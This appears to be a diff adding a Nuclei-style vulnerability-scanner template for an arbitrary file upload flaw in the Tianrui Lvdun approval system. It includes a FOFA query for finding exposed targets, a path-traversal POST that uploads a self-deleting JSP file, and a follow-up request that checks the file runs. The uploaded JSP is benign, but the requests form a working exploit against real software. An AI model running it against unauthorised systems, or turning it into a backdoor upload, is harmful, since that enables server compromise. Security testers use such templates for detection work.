@@ -1,0 +1,44 @@
+id: TianRui-uploadWxFile-File-upload
+
+info:
+  name: "天锐绿盾审批系统 uploadWxFile.do 任意文件上传漏洞"
+  author: HuanXiong
+  severity: critical
+  description: |-
+    fofa: app="TIPPAY-绿盾审批系统"
+    天锐绿盾审批系统 uploadWxFile.do 接口存在文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference:
+    - 
+  tags: 天锐绿盾审批系统
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /trwfe/service/.%2E/config/uploadWxFile.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Accept-Encoding: gzip
+
+        --WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="file"; filename="{{username}}.jsp"
+        Content-Type: application/vnd.ms-excel
+
+        <% out.println("pboyjnnrfipmplsukdeczudsefxmywe"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        --WebKitFormBoundaryFfJZ4PlAZBixjELj--
+
+  - raw:
+      - |
+        GET /{{username}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        name: 任意文件上传
+        dsl:
+          - 'status_code==200 && contains_all(body,"pboyjnnrfipmplsukdeczudsefxmywe")'
